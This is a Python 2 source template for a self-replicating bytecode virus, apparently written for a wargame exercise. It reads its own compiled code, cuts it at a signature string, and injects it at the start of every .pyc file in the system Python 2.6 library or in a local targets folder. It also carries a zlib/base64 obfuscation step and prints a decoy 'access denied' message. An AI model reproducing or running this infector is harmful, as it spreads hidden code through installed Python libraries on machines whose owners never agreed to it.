signature = "PY_2.6"

import socket
import marshal
import zlib
import glob
from base64 import b64decode, b64encode

if __file__.endswith('.pyc'):


    def no_op_layer_crypt(clear):
        return clear


    no_op_layer_DECRYPT = """
def decrypt(crypted):
    return crypted
    """

    def obfuscate(marshalled, layer_crypt=no_op_layer_crypt, layer_DECRYPT=no_op_layer_DECRYPT):
        # compress step
        compressed = zlib.compress(marshalled)

        # crypt step
        crypted = layer_crypt(compressed)

        # B64 step
        b64 = b64encode(crypted)

        # template injection step
        template = b64decode("__TEMPLATE_PY__")
        template = template.replace("__PAYLOAD_PLACEHOLDER__", b64)
        template = template.replace("__DECRYPT_PLACEHOLDER__", layer_DECRYPT)

        # template compile step
        template_compiled = compile(template, "z", "exec")

        # marshall step
        return marshal.dumps(template_compiled)



    # ------------- GENERATING BYTEPLAY DATA (for injector) ---------------
    byteplay = None
    exec b64decode("__BYTEPLAY_PY__")
    byteplay_src = b64encode(zlib.compress("__BYTEPLAY_PY__", 9))

    # ------------- GENERATING PAYLOAD DATA ---------------
    payload = "__PAYLOAD_PY__"
    payload = Code.from_code(compile(b64decode(payload), "a", "exec"))
    payload.code = payload.code[:-1]
    for i, instr in enumerate(payload.code):
        if instr[0] == SetLineno:
            payload.code.pop(i)
    payload = b64encode(marshal.dumps(payload.to_code()))


    def infect(f_to_infect, payload):
        print "j'injecte %s"%payload.code
        if f_to_infect.endswith("socket.pyc"):
            return

        f = open(f_to_infect, 'r')

        #Magic number and timestamp
        head = f.read(8)

        data = Code.from_code(marshal.loads(f.read()))

        f.close()

        data.code[:0] = payload.code

        newfile = open(f_to_infect, 'w')
        newfile.write(head)
        marshal.dump(data.to_code(), newfile)
        newfile.close()


    f = open(__file__, 'r')
    head = f.read(8)
    data = Code.from_code(marshal.loads(f.read()))
    f.close()
    payload = data
    print "loaded payload"
    print payload.code

    EXPLOIT_SIZE = None
    for i in xrange(2, len(data.code)):
      if type(data.code[i][1]) == type('') and data.code[i][1] == signature:
         EXPLOIT_SIZE = i+1
         break

    if not EXPLOIT_SIZE:
        print "EXPLoiT_ISZE not found"
        print data.code

    data.code = data.code[:EXPLOIT_SIZE]
    lolita = marshal.dumps(data.to_code())

    #for i in range(1):
    #    lolita = obfuscate(lolita)#, xor_layer)

    lolita = Code.from_code(marshal.loads(lolita))
    
    print """

    LLLLLLLLLLL                              lllllll   iiii          tttt                                         66666666  999999999
    L:::::::::L                              l:::::l  i::::i      ttt:::t                                        6::::::6 99:::::::::99
    L:::::::::L                              l:::::l   iiii       t:::::t                                       6::::::699:::::::::::::99
    LL:::::::LL                              l:::::l              t:::::t                                      6::::::69::::::99999::::::9
      L:::::L                  ooooooooooo    l::::l iiiiiiittttttt:::::ttttttt      aaaaaaaaaaaaa            6::::::6 9:::::9     9:::::9
      L:::::L                oo:::::::::::oo  l::::l i:::::it:::::::::::::::::t      a::::::::::::a          6::::::6  9:::::9     9:::::9
      L:::::L               o:::::::::::::::o l::::l  i::::it:::::::::::::::::t      aaaaaaaaa:::::a        6::::::6    9:::::99999::::::9
      L:::::L               o:::::ooooo:::::o l::::l  i::::itttttt:::::::tttttt               a::::a       6::::::::6666699::::::::::::::9
      L:::::L               o::::o     o::::o l::::l  i::::i      t:::::t              aaaaaaa:::::a      6::::::::::::::6699999::::::::9
      L:::::L               o::::o     o::::o l::::l  i::::i      t:::::t            aa::::::::::::a      6::::::66666:::::6    9::::::9
      L:::::L               o::::o     o::::o l::::l  i::::i      t:::::t           a::::aaaa::::::a      6:::::6     6:::::6  9::::::9
      L:::::L         LLLLLLo::::o     o::::o l::::l  i::::i      t:::::t    tttttta::::a    a:::::a      6:::::6     6:::::6 9::::::9
    LL:::::::LLLLLLLLL:::::Lo:::::ooooo:::::ol::::::li::::::i     t::::::tttt:::::ta::::a    a:::::a      6::::::66666::::::69::::::9
    L::::::::::::::::::::::Lo:::::::::::::::ol::::::li::::::i     tt::::::::::::::ta:::::aaaa::::::a       66:::::::::::::669::::::9
    L::::::::::::::::::::::L oo:::::::::::oo l::::::li::::::i       tt:::::::::::tt a::::::::::aa:::a        66:::::::::66 9::::::9
    LLLLLLLLLLLLLLLLLLLLLLLL   ooooooooooo   lllllllliiiiiiii         ttttttttttt    aaaaaaaaaa  aaaa          666666666  99999999
    """

    if socket.gethostname() == "OT-Wargame":
        target_dir = "/usr/lib/python2.6/*.pyc"
    else:
        target_dir = "./targets/*.pyc"

    for i in glob.glob(target_dir):
        infect(i, lolita)


    print "Unfortunately your computer's specifications do not allow you access to our service.\nExiting..."

signature = "PY_2.6"
